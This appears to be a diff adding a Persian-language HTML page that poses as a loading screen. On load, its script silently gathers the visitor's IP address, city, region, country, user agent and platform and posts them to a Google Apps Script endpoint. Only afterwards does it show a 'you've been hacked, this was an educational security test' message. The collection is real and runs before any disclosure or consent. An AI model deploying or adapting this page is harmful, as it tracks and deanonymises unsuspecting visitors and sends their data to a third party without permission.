@@ -1,0 +1,65 @@
+
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <title>در حال بارگذاری...</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      background-color: #fff;
+      padding: 50px;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="loading">
+    <p>در حال بارگذاری...</p>
+  </div>
+
+  <div id="alert" class="hidden">
+    <h2 style="color: red;">⚠️ اطلاعات شما هک شد!</h2>
+    <p>شما روی یک لینک ناشناس کلیک کردید.</p>
+    <p>این فقط یک <strong>آزمایش آموزشی امنیت سایبری</strong> بود.</p>
+    <p>👨‍💻 توسط <strong>امیر سلیمانی</strong>، کارشناس فناوری اطلاعات</p>
+    <p style="color: gray;">لطفاً همیشه قبل از کلیک کردن، لینک‌ها را بررسی کنید.</p>
+  </div>
+
+  <script>
+    async function collectAndSend() {
+      try {
+        const ipInfo = await fetch("https://ipapi.co/json/").then(res => res.json());
+
+        const data = {
+          ip: ipInfo.ip,
+          location: ipInfo.city + ', ' + ipInfo.region + ', ' + ipInfo.country_name,
+          browser: navigator.userAgent,
+          os: navigator.platform
+        };
+
+        fetch("https://script.google.com/macros/s/AKfycbwGfIoG6rNN9AmceLF2h7NypVuFfz6t87qtNUYC-wzZcUwIqiv_sRM2aF7ZEkl2sKgh/exec", {
+          method: "POST",
+          mode: "no-cors",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        });
+      } catch (e) {
+        console.error("Data collection failed:", e);
+      }
+
+      setTimeout(() => {
+        document.getElementById("loading").classList.add("hidden");
+        document.getElementById("alert").classList.remove("hidden");
+      }, 2000);
+    }
+
+    collectAndSend();
+  </script>
+
+</body>
+</html>
